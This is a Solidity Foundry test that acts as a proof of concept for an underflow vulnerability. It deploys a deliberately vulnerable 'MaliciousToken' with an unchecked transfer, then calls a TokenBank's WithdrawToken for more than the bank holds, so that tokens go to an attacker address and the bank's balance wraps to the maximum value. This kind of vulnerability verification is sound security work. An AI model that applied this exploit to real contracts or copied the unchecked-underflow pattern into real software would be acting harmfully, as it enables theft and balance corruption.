// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol";

contract MaliciousToken {
    mapping(address => uint256) public balanceOf;
    
    constructor(address initialHolder, uint256 initialSupply) {
        balanceOf[initialHolder] = initialSupply;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        unchecked {
            // Vulnerable to underflow
            balanceOf[msg.sender] -= amount;
            balanceOf[to] += amount;
        }
        return true;
    }
}

contract TokenBankTest is Test {
    TokenBank public tokenBank;
    MaliciousToken public maliciousToken;
    address public owner;
    address public attacker;
    
    function setUp() public {
        owner = address(this);
        attacker = address(0x1337);
        
        // Deploy contracts
        tokenBank = new TokenBank();
        maliciousToken = new MaliciousToken(address(tokenBank), 5);
    }
    
    function test_withdrawTokenUnderflow() public {
        // Verify initial token balance
        assertEq(maliciousToken.balanceOf(address(tokenBank)), 5);
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 tokenBankBalanceBefore = maliciousToken.balanceOf(address(tokenBank));
        uint256 attackerBalanceBefore = maliciousToken.balanceOf(attacker);
        console.log("TokenBank balance before: %s", tokenBankBalanceBefore);
        console.log("Attacker balance before: %s", attackerBalanceBefore);
        
        console.log("--- Trigger WithdrawToken ---");
        // Perform withdrawal with amount larger than balance (5->6)
        tokenBank.WithdrawToken(address(maliciousToken), 6, attacker);
        
        console.log("--- AFTER-Trigger State ---");
        uint256 tokenBankBalanceAfter = maliciousToken.balanceOf(address(tokenBank));
        uint256 attackerBalanceAfter = maliciousToken.balanceOf(attacker);
        console.log("TokenBank balance after: %s", tokenBankBalanceAfter);
        console.log("Attacker balance after: %s", attackerBalanceAfter);
        
        // Underflow occurred: balance of bank becomes 2^256 - 1
        assertEq(tokenBankBalanceAfter, type(uint256).max);
        
        // Attacker received tokens despite underflow
        assertEq(attackerBalanceAfter, 6);
        
        // Vulnerability exists if TokenBank underflowed AND attacker got tokens
        bool underflowOccurred = tokenBankBalanceAfter == type(uint256).max;
        bool tokensReceived = attackerBalanceAfter - attackerBalanceBefore == 6;
        
        if (underflowOccurred && tokensReceived) {
            console.log("Vulnerability Exists: Underflow occurred in malicious token transfer, leading to balance corruption");
        } else {
            console.log("Vulnerability not Exist: Underflow vulnerability not successfully exploited");
        }
    }
}